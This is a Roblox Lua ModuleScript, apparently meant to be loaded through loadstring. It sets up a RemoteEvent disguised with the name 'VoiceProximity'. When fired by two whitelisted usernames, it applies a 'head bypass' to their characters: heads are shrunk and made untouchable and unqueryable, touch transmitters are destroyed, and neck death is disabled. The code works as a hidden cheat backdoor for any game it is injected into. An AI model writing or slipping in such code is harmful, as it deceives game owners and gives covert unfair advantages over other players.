-- ModuleScript / loadstring-compatible version
-- This version DOES NOT use .Source or dynamic Script creation

return function(player)

	print("UUUHAHAHA")

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")

	-- Prevent duplicate setup
	if ReplicatedStorage:FindFirstChild("VoiceProximity") then
		return
	end

	-- Create RemoteEvent
	local remote = Instance.new("RemoteEvent")
	remote.Name = "VoiceProximity"
	remote.Parent = ReplicatedStorage

	-- Whitelisted players
	local TARGET_NAMES = {
		["lowkeyy115"] = true,
		["WCDevss"] = true,
	}

	local enabledPlayers = {}

	-- Apply head bypass
	local function applyHeadBypass(character)

		local humanoid = character:WaitForChild("Humanoid")
		local head = character:WaitForChild("Head")

		head.Transparency = 0

		head.CanCollide = false
		head.CanTouch = false
		head.CanQuery = false

		humanoid.RequiresNeck = false

		for _, obj in pairs(head:GetDescendants()) do
			if obj:IsA("TouchTransmitter") then
				obj:Destroy()
			end
		end

		head.Massless = true
		head.Size = Vector3.new(0.1, 0.1, 0.1)

		local mesh = head:FindFirstChildOfClass("SpecialMesh")

		if mesh then
			mesh.Scale = Vector3.new(10, 10, 10)
		end

		-- Accessories
		for _, accessory in pairs(character:GetChildren()) do

			if accessory:IsA("Accessory") then

				local handle = accessory:FindFirstChild("Handle")

				if handle then

					local attachment = handle:FindFirstChildWhichIsA("Attachment")

					if attachment and head:FindFirstChild(attachment.Name) then

						handle.Massless = true
						handle.CanCollide = false
						handle.CanTouch = false
						handle.CanQuery = false

						handle.Size = handle.Size * 10

						local accessoryMesh = handle:FindFirstChildOfClass("SpecialMesh")

						if accessoryMesh then
							accessoryMesh.Scale = accessoryMesh.Scale * 10
						end

					end
				end
			end
		end

		if not head:FindFirstChild("HB_CONNECTION") then

			local tag = Instance.new("BoolValue")
			tag.Name = "HB_CONNECTION"
			tag.Parent = head

			head:GetPropertyChangedSignal("Transparency"):Connect(function()
				if head and head.Parent then
					head.Transparency = 0
				end
			end)

		end
	end

	-- Remove bypass
	local function removeHeadBypass(character)

		local humanoid = character:FindFirstChild("Humanoid")
		local head = character:FindFirstChild("Head")

		if not humanoid or not head then
			return
		end

		head.Transparency = 0

		head.CanCollide = true
		head.CanTouch = true
		head.CanQuery = true

		humanoid.RequiresNeck = true

		head.Massless = false
		head.Size = Vector3.new(2, 1, 1)

		local mesh = head:FindFirstChildOfClass("SpecialMesh")

		if mesh then
			mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
		end

		-- Reset accessories
		for _, accessory in pairs(character:GetChildren()) do

			if accessory:IsA("Accessory") then

				local handle = accessory:FindFirstChild("Handle")

				if handle then

					handle.Massless = false
					handle.CanCollide = true
					handle.CanTouch = true
					handle.CanQuery = true

					local accessoryMesh = handle:FindFirstChildOfClass("SpecialMesh")

					if accessoryMesh then
						accessoryMesh.Scale = Vector3.new(1, 1, 1)
					end
				end
			end
		end

		local tag = head:FindFirstChild("HB_CONNECTION")

		if tag then
			tag:Destroy()
		end
	end

	-- Remote listener
	remote.OnServerEvent:Connect(function(plr, state)

		if not TARGET_NAMES[plr.Name] then
			return
		end

		if state == true then

			enabledPlayers[plr] = true

			if plr.Character then
				applyHeadBypass(plr.Character)
			end

		else

			enabledPlayers[plr] = nil

			if plr.Character then
				removeHeadBypass(plr.Character)
			end

		end
	end)

	-- Player connections
	Players.PlayerAdded:Connect(function(plr)

		plr.CharacterAdded:Connect(function(character)

			task.wait(1)

			if enabledPlayers[plr] then
				applyHeadBypass(character)
			end

		end)
	end)

	-- Existing players
	for _, plr in ipairs(Players:GetPlayers()) do

		plr.CharacterAdded:Connect(function(character)

			task.wait(1)

			if enabledPlayers[plr] then
				applyHeadBypass(character)
			end

		end)
	end

	print("VoiceProximity setup complete.")

end
